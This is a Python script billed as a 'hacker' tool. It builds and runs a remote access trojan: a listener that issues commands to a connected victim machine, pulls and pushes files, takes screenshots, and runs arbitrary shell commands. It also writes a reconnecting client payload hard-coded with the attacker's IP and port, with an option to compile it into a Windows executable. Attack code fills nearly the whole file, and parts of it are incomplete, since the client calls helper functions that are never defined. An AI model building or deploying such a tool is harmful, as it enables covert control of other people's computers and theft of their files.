def install_pkg():
    import time
    import os
    msf = input("Do You Want To Install Pkg's ?")
    if msf.lower() == "yes" or msf.lower() == "y" or msf.lower() == "yea" or msf.lower() == "yeah":
        try:
            print("Pkg's installing.....")
            time.sleep(2)
            print("______________________________________Installing Colorama.....___________________________________")
            os.system("pip install colorama")
            print("____________________________Installing Colorama Done!________________________________")
        finally:
            print("______________________Installing pymsgbox...___________________________")
            time.sleep(1)
            os.system("pip install pymsgbox")
            print("______________________Installing Pymsgbox Done!__________________________")
        try:
            print("_____________________Installing pyautogui...__________________")
            time.sleep(1)
            os.system("pip install pyautogui")
            print("________________-Installing Pyautogui Done!__________________")
            print("____________Installing Pyinstaller..._____________")
            time.sleep(1)
            os.system("pip install pyinstaller")
            print("______________________________Installing Pyinstaller Done!_______________________________")
            print("________________________________________________All Pkg's Installed!!!________________________________")
        except:
            print("EROR")
    else:
        print('Ok')
install_pkg()
from colorama import Fore, Back, Style
import socket
import random
import subprocess
import pymsgbox
import pyautogui
import shutil
import winreg
import os
from time import *
#------------------------------------------------------------------------------------------------------------------------------------------------------------------
#don't edit!!!!!!!!!!!!!!!!!!!!!!
def SHELL():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((ip1,port2))
    s.listen(1)
    print(f"Server Started On PORT: {port2} , IP: {ip1}")
    print("Listening...")
    c , addr = s.accept()
    def banner():
        print(f"{addr} Connected!")
    banner()

    while True:
        msg = input("[>>>]")
        if msg == "":
            continue

        elif msg[0:8] == "download":
            target = msg[9:]
            c.send(msg.encode('utf-8'))
            f = open(target,"wb")
            i = 0
            while True:
                i += 1 
                print(f"Data Downloading: {i}")
                data = c.recv(4096)
                if data == b'Done':
                    break
                f.write(data)
            f.close()
            print("Download Completed...")
            continue

        elif msg[0:6] == "upload":
            c.send(msg.encode('utf-8'))
            target = msg[7:]
            f = open(target ,"rb")
            l = f.read(4096)
            while (l):
                c.send(l)
                print('Sent : ',repr(l))
                l = f.read(4096)
            f.close()
            c.send('Done'.encode('utf-8'))
            print("Upload Complete")
            continue

        elif msg == "screen":
            c.send(msg.encode('utf-8'))
            f = open("PIC.png","wb")
            i = 0
            while True :
                i += 1
                print(f" data reciving... {i}")
                data = c.recv(4096)
                if data == b'Done':
                    break
                f.write(data)
            f.close()
            print(f"Download Completed ... ")
            continue 

        elif msg[0:2] == "cd":
            c.send(msg.encode('utf-8'))
            res = c.recv(4096).decode('utf-8')
            print(res)
            continue

        elif msg == "info":
            c.send(msg.encode('utf-8'))
            res = c.recv(4096).decode('utf-8')
            print(res)
            continue

        elif msg[0:3] == "msg":
           c.send(msg.encode('utf-8'))
           print('Sent!')
           continue

        else:
            c.send(msg.encode('utf-8'))
            res = c.recv(4096).decode('utf-8')
            print(res)
            continue
    s.close()
#====================================================================================================================================================
def yyyy():
        print(Fore.BLUE + """                                                                                             
        _____   _____                   ____        _______     _______   _____    _____     
   _____\    \_|\    \              ____\_  \__    /      /|   |\      \ |\    \   \    \    
  /     /|     |\\    \            /     /     \  /      / |   | \      \ \\    \   |    |   
 /     / /____/| \\    \          /     /\      ||      /  |___|  \      | \\    \  |    |   
|     | |____|/   \|    | ______ |     |  |     ||      |  |   |  |      |  \|    \ |    |   
|     |  _____     |    |/      \|     |  |     ||       \ \   / /       |   |     \|    |   
|\     \|\    \    /            ||     | /     /||      |\\/   \//|      |  /     /\      \  
| \_____\|    |   /_____/\_____/||\     \_____/ ||\_____\|\_____/|/_____/| /_____/ /______/| 
| |     /____/|  |      | |    ||| \_____\   | / | |     | |   | |     | ||      | |     | | 
 \|_____|    ||  |______|/|____|/ \ |    |___|/   \|_____|\|___|/|_____|/ |______|/|_____|/  
        |____|/                    \|____|                                                   """)
        llll = input("Do You Want Convert Client To Be Exe? [y/n]:")
        if llll == 'y':
            os.system('pyinstaller --onefile cccc.py')
            SHELL()
        elif llll == 'n':
            SHELL()
        elif Input_Hacker == '2':
            print(Fore.RED + 'Update Not Fuond!!')
        elif Input_Hacker == '3':
            print(Fore.BLUE + 'Tanks For Run It')
#--------------------------------------------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------------------------------------------------------------------------------------------------------
#-----------------------------------\----------------------------------------------------------------------------------------------------------------------------
Input_Hacker = input(Fore.GREEN + """
                                 _________________________________________________________________________________
                                 |     hello Hacker                                                    secrt world|
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |              __                                                                |
                                 |        _____/ /___ _      __v1.0.0____                                         |
                                 |       / ___/ / __ \ | /| / / __ \                                              |
                                 |      / /__/ / /_/ / |/ |/ / / / /                                              |
                                 |      \___/_/\____/|__/|__/_/ /_/  @secrt world                                 |
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |________________________________________________________________________________|                                                                               
                                 |1-hack command promtarget (shell)                                               |
                                 |2-update tool                                                                   |
                                 |3-quite                                                                         |
                                 |                                                                                |
                                 |________________________________________________________________________________|
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |________________________________________________________________________________|
                                [>>>>]""")
#________________________________________________________________________________________________________________________________________________________________________________________________
#_______________________________________________________________________________________________________________________________________________________________________
if Input_Hacker == '1':
    print(Fore.GREEN + 'Ok')
    ip1 = input(Fore.GREEN + "What's Ip? :")
    port2 = int(input(Fore.GREEN +"And Port?"))
#_______________________________________________________________________________----________________________________________________________________________________________
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
cod_to_write = f"""
def main():
    ip = "{ip1}"
    port = {port2}
    s = connect_server(ip,port)

    while True:
        try:
            recive = s.recv(4096).decode('utf-8')

            if recive == "":
                continue
            

            elif recive.startswith("download"):
                download_file(s,recive[9:])

            elif recive.startswith("upload"):
                upload_file(s,recive[7:])

            elif recive == "screen":
                screen(s)

            elif recive == "info":
                sysinfo(s)

            elif recive.startswith("msg"):
                msg(s,recive[4:])
                
            elif recive.startswith("cd"):
                change_cd(s,recive[3:])

            else:
                cmd(s,recive)

        except Exception as ex:
            print(ex)
            s.close()
            s = reconnect(ip,port)


        try:
            s.send(b'Are you ok server?')
            sleep(10)
        except Exception as ex:
            print(ex)
            s.close()
            s = reconnect(ip,port)


    s.close()


if __name__ == "__main__":
    main()"""
#_____________________________________________________________________________________________________________________________________________________________________________
#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

def delll():
    file_name = 'cccc.py'
    with open(file_name, "r") as file:
        lines = file.readlines()
    line_to_edit = lines[:104]
    with open(file_name, 'w') as file:
        file.writelines(line_to_edit)

def cc():
        file_path = os.getcwd() + '/cccc.py'
        with open(file_path, 'a') as f:
            f.write(cod_to_write)
            f.close()
        yyyy()
        

if Input_Hacker == '1':
    delll()
    cc()
if Input_Hacker == '2':
    print(Fore.RED + 'Update Not Fund')
    Input_Hacker = input(Fore.GREEN + """
                                 _________________________________________________________________________________
                                 |     hello Hacker                                                    secrt world|
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |              __                                                                |
                                 |        _____/ /___ _      __v1.0.0____                                         |
                                 |       / ___/ / __ \ | /| / / __ \                                              |
                                 |      / /__/ / /_/ / |/ |/ / / / /                                              |
                                 |      \___/_/\____/|__/|__/_/ /_/  @secrt world                                 |
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |________________________________________________________________________________|                                                                               
                                 |1-hack command promtarget (shell)                                               |
                                 |2-update tool                                                                   |
                                 |3-quite                                                                         |
                                 |                                                                                |
                                 |________________________________________________________________________________|
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |                                                                                |
                                 |________________________________________________________________________________|
                                [>>>>]""")
elif Input_Hacker == '3':
    quit()     


#---------------------------------------------------------------------------------------------------------------------------------------------------------------
